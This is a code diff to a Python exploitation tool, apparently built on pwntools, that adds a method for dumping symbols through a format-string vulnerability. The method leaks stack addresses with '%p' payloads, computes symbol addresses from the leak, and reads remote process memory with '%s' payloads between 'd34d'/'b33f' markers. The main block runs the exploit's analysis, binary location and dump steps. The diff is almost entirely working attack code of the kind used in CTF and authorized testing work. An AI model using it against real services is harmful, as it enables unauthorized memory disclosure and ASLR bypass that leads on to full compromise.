@@ -411,6 +411,7 @@ class ffstr():
 			while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
 				data = self.asyncExchange(pl)
 
+
 			left = data.find(b"d34d")+len(b"d34d")
 			right= data.find(b"b33f")
 			
@@ -441,9 +442,62 @@ class ffstr():
 		# Load ELF as per pwntools methodology from dumped binary
 		self.elf  = ELF(self.dump_name)
 		
+	def showSymbols(self):
+		# Read binary symbols
+		
+		# Working on a stack copy
+		if self.elf is None:
+			log.info("No ELF as support ...")
+			return
+			
+		# read each symbols
+		for sym in self.elf.symbols.keys():
+			
+			# Get location
+			i , offset = self.start
+			
+			# symbol addr
+			addr = self.elf.symbols[sym]
+			
+			# Leak an hexadecimal value
+			leak = None
+			while leak is None:
+				data = self.asyncExchange(self.stackPayload(i+1,"p")) #
+				regex = re.search(self.re_HexaPattern, data)
+				if regex:
+					leak = int(regex[0],16)
+			log.info("Leak "+hex(leak)+" ... Offset "+hex(offset)+" "+sym+" "+hex(addr))
+					
+			# Set payload
+			if self.bits == 32:
+				pos_arg = self.stack_arg+2+2
+				pl = self.stackPayload(pos_arg,"s",size=8+4*2,left="d34d",right="b33f")+p32(leak - offset + addr)
+			else:
+				pos_arg = self.stack_arg+1+2
+				pl = self.stackPayload(pos_arg,"s",size=8+8*2,left="    d34d",right="b33f    ")+p64(leak - offset + addr)
+					
+			# Get Data
+			data = b""
+			while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
+				data = self.asyncExchange(pl)
+
+
+			left = data.find(b"d34d")+len(b"d34d")
+			right= data.find(b"b33f")
+			
+			# Extract data 
+			if data.find(b"d34d")>-1 and data.find(b"b33f")>-1:
+				dump =data[left:right]
+				print(dump)
+
+				
+			# Close connexion
+			if not all(self.blind_behavior):
+				self.close()
+				
 if __name__ == "__main__":
 
-	# TBN instanciation
+	# ffstr instanciation
 	exploit = ffstr()
 	exploit.getArgs()
 	exploit.mentalist(nb_input=10,t_out=0.25)
@@ -451,5 +505,6 @@ if __name__ == "__main__":
 	exploit.stackAnalyze()
 	exploit.locateBinary()
 	exploit.dumpBinary()
+	exploit.showSymbols()
 	
 	print(exploit.__dict__)
